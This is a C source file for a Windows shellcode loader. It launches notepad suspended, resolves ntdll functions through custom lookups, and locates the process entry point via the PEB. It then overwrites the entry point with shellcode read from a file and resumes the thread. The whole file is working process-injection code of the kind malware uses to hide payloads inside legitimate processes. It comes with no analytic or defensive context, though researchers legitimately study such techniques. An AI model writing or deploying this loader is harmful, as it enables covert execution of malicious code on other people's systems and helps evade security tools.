#include "structs.h"

#define NT_SUCCESS( Status ) ( ( NTSTATUS )( Status ) >= 0 )

int main(int argc, char** argv)
{
	if (argc != 2) {
		printf("Usage: %s <shellcode file>\n", argv[0]);
		return 1;
	}

	CHAR* fileName = argv[1];

	// Importing  NT functions

	printf("[+] Importing NT functions\n");

	HMODULE hNtdll = GetDH("ntdll.dll");
	if (hNtdll == NULL) {
		printf("[-] Failed to get handle to Ntdll.dll\n");
		return 1;
	}

	_NtQueryInformationProcess NTQIP = (_NtQueryInformationProcess)GetExportedFunctionAddress(hNtdll, "NtQueryInformationProcess");
	if (!NTQIP) {
		printf("[-] Failed to resolve NtQueryInformationProcess\n");
		return 1;
	}
	_NtReadVirtualMemory ReadMemory = (_NtReadVirtualMemory)GetExportedFunctionAddress(hNtdll, "NtReadVirtualMemory");
	if (!ReadMemory) {
		printf("[-] Failed to resolve NtReadVirtualMemory\n");
		return 1;
	}
	_NtProtectVirtualMemory changeMem = (_NtProtectVirtualMemory)GetExportedFunctionAddress(hNtdll, "NtProtectVirtualMemory");
	if (!changeMem) {
		printf("[-] Failed to resolve NtProtectVirtualMemory\n");
		return 1;
	}
	_NtResumeThread resThread = (_NtResumeThread)GetExportedFunctionAddress(hNtdll, "NtResumeThread");
	if (!resThread) {
		printf("[-] Failed to resolve NtResumeThread\n");
		return 1;
	}
	_NtWriteVirtualMemory writeMem = (_NtWriteVirtualMemory)GetExportedFunctionAddress(hNtdll, "NtWriteVirtualMemory");
	if (!writeMem) {
		printf("[-] Failed to resolve NtWriteVirtualMemory\n");
		return 1;
	}


	// Reading ShellCode File

	SIZE_T shellcodesize = 0;
	LPVOID shellCode = NULL;
	if (!ReadShellcodeFile(fileName, &shellCode, &shellcodesize)) {
		printf("[-] ReadShellcodeFile failed\n");
		return 1;
	}


	// Launching Remote Process

	printf("[*] Launching suspended notepad process\n");

	int writtenBytes = 0;
	PROCESS_INFORMATION PSinformations = { 0 };
	if (!LaunchnotepadAndGetPID(&PSinformations)) {
		printf("[-] LaunchnotepadAndGetPID failed\n");
		return 1;
	}
	
	HANDLE hPS = PSinformations.hProcess;
	DWORD PSPID = PSinformations.dwProcessId;
	if (hPS == NULL) {
		printf("[-] Failed to get Process Handle");
		return 1;
	}

	printf("[+] Process created\n");


	// Getting Remote Process PEB

	PROCESS_BASIC_INFORMATION pbi = { 0 };
	ULONG returnLength = 0;
	NTSTATUS qipStatus = NTQIP(hPS,	ProcessBasicInformation, &pbi, sizeof(pbi),	&returnLength);
	if (!NT_SUCCESS(qipStatus)) {
		printf("[-] NtQueryInformationProcess failed. NTSTATUS: 0x%08X\n", qipStatus);
		return 1;
	}
	printf("[+] NtQueryInformationProcess returned\n");


	// Calculating Entry Point

	PPEB pPeb = (PPEB)pbi.PebBaseAddress;
	if (pPeb == NULL) {
		printf("[-] Failed to resolve remote PEB");
		CloseHandle(hPS);
		return 1;
	}
	LPVOID lpBaseAddress = &pPeb->ImageBase;

	printf("[*] ImageBase pointer address (PEB->ImageBase): %p\n", lpBaseAddress);

	LPVOID baseAddress = 0;
	ULONG bytesRead = 0;
	NTSTATUS readStatusBA = ReadMemory(hPS, lpBaseAddress, &baseAddress, 8, &bytesRead);
	if (!NT_SUCCESS(readStatusBA)) {
		printf("[-] NtReadVirtualMemory failed. NTSTATUS: 0x%08X\n", readStatusBA);
		return 1;
	}

	IMAGE_DOS_HEADER dHeader = { 0 };
	NTSTATUS readStatusDH = ReadMemory(hPS, baseAddress, &dHeader, sizeof(dHeader), &bytesRead);
	if (!NT_SUCCESS(readStatusDH)) {
		printf("[-] NtReadVirtualMemory failed. NTSTATUS: 0x%08X\n", readStatusDH);
		return 1;
	}

	LPVOID lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

	printf("[*] NT Headers address: %p\n", lpNtHeader);

	IMAGE_NT_HEADERS ntHeaders = { 0 };
	NTSTATUS readStatusNT = ReadMemory(hPS, lpNtHeader, &ntHeaders, sizeof(ntHeaders), &bytesRead);
	if (!NT_SUCCESS(readStatusNT)) {
		printf("[-] NtReadVirtualMemory failed. NTSTATUS: 0x%08X\n", readStatusNT);
		return 1;
	}

	LPVOID entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

	printf("[+] EntryPoint calculated: %p\n", entryPoint);


	// Changing Memory Protection to RW

	PVOID base = entryPoint;
	SIZE_T size = shellcodesize;
	ULONG oldProtect = 0;

	printf("[*] Changing memory protection to PAGE_READWRITE\n");

	NTSTATUS changeStatus = changeMem(hPS, &base, &size, PAGE_READWRITE, &oldProtect);
	if (!NT_SUCCESS(changeStatus)) {
		printf("[-] NtProtectVirtualMemory failed. NTSTATUS: 0x%08X\n", changeStatus);
		return 1;
	}

	printf("[*] Writing shellcode to EntryPoint\n");


	// Writing Shellcode to Entry Point

	SIZE_T bytesWritten = 0;
	NTSTATUS writeStatus = writeMem(hPS, entryPoint, shellCode, shellcodesize, &bytesWritten);
	if (!NT_SUCCESS(writeStatus)) {
		printf("[-] NtWriteVirtualMemory failed. NTSTATUS: 0x%08X\n", writeStatus);
		return 1;
	}



	printf("[*] Restoring original memory protection\n");

	// Changing Memory Protection Back to Its Original State

	ULONG newProtect = 0;
	NTSTATUS restoreStatus = changeMem(hPS, &base, &size, oldProtect, &newProtect);
	if (!NT_SUCCESS(restoreStatus)) {
		printf("[-] NtProtectVirtualMemory failed. NTSTATUS: 0x%08X\n", restoreStatus);
		return 1;
	}


	// Resuming Thread

	printf("[*] Resuming main thread\n");

	NTSTATUS resumeStatus = resThread(PSinformations.hThread, NULL);
	if (!NT_SUCCESS(resumeStatus)) {
		printf("[-] NtResumeThread failed. NTSTATUS: 0x%08X\n", resumeStatus);
		return 1;
	}

	CloseHandle(hPS);

}